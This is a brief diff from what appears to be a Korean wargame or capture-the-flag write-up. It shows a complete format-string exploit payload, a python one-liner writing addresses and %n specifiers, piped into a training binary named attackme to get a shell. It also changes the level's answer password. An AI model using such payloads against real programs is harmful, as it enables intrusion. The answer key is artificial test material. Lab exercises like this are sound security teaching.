@@ -352,4 +352,4 @@ EGGSHELL의 주소가 0xbffff2c4 일때,
 
 페이로드 작성 2 : (python -c 'print "\x98\x95\x04\x08"+"A"*4+"\x99\x95\x04\x08"+"A"*4+"\x9a\x95\x04\x08"+"A"*4+"\x9b\x95\x04\x08"+"A"*4+"%08x"*2+"%148x"+"%n"+"%46x"+"%n"+"%13x"+"%n"+"%192x"+"%n"';cat) | ./attackme
 
-답 : we are just regular guys
+답 : i will come in a minute
